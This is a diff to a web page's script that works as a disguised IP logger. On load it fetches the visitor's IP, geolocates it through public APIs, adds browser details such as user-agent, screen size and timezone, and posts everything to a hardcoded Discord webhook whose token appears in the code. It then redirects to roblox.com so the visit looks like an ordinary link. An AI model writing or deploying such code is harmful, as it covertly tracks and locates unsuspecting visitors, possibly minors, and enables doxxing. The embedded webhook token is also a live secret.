@@ -4,48 +4,87 @@
 <script>
 const webhook = "https://discord.com/api/webhooks/1532569658543177738/GytKMid4oNbpE8jS9X_zdcqJf1ZcW23V3_V9LYOST85C4v5ZWbtT198sLiZStmZJdyOk";
 
-// Method 1: Using a different IP service
-fetch('https://api.ipify.org?format=json')
-    .then(r => r.json())
-    .then(data => {
-        return fetch('https://ipinfo.io/' + data.ip + '/json');
-    })
-    .then(r => r.json())
-    .then(location => {
-        const message = {
-            content: "**IP:** " + location.ip + 
-                    "\n**City:** " + location.city + 
-                    "\n**Region:** " + location.region + 
-                    "\n**Country:** " + location.country +
-                    "\n**ISP:** " + location.org +
-                    "\n**Location:** https://maps.google.com/?q=" + location.loc
-        };
-        
-        return fetch(webhook, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify(message)
-        });
-    })
-    .catch(() => {
-        // Fallback: Use a different service
-        fetch('https://geolocation-db.com/json/')
-            .then(r => r.json())
-            .then(data => {
+// Use JSONP to get IP
+function getIP() {
+    const script = document.createElement('script');
+    script.src = 'https://api.ipify.org?format=jsonp&callback=handleIP';
+    document.body.appendChild(script);
+}
+
+function handleIP(data) {
+    const ip = data.ip;
+    
+    // Send IP first
+    fetch(webhook, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+            content: "**IP:** " + ip
+        })
+    });
+    
+    // Use ip-api.com for better location data (no API key needed)
+    fetch('https://ip-api.com/json/' + ip + '?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,asname,proxy,hosting,query')
+        .then(r => r.json())
+        .then(loc => {
+            if (loc.status === 'success') {
+                const locationInfo = 
+                    "**IP:** " + loc.query +
+                    "\n**Country:** " + loc.country + " (" + loc.countryCode + ")" +
+                    "\n**Region:** " + loc.regionName +
+                    "\n**City:** " + loc.city +
+                    "\n**ZIP:** " + loc.zip +
+                    "\n**Coordinates:** " + loc.lat + ", " + loc.lon +
+                    "\n**Timezone:** " + loc.timezone +
+                    "\n**ISP:** " + loc.isp +
+                    "\n**Organization:** " + loc.org +
+                    "\n**ASN:** " + loc.as + " (" + loc.asname + ")" +
+                    "\n**Proxy/VPN:** " + loc.proxy +
+                    "\n**Hosting:** " + loc.hosting +
+                    "\n**Google Maps:** https://www.google.com/maps?q=" + loc.lat + "," + loc.lon;
+                
                 fetch(webhook, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({
-                        content: "**IP:** " + data.IPv4 + "\n**City:** " + data.city + "\n**Country:** " + data.country_name
+                        content: locationInfo
                     })
                 });
+            } else {
+                fetch(webhook, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        content: "❌ Location lookup failed: " + loc.message
+                    })
+                });
+            }
+        })
+        .catch(err => {
+            fetch(webhook, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    content: "❌ Error: " + err.message
+                })
             });
+        });
+    
+    // Also get timezone and other browser info
+    fetch(webhook, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+            content: "**Browser Info:**\nUser-Agent: " + navigator.userAgent + "\nLanguage: " + navigator.language + "\nScreen: " + screen.width + "x" + screen.height + "\nTimezone: " + Intl.DateTimeFormat().resolvedOptions().timeZone
+        })
     });
+}
 
-// Redirect
+getIP();
+
 setTimeout(() => {
     window.location.href = "https://www.roblox.com";
-}, 3000);
+}, 4000);
 </script>
 </body>
 </html>
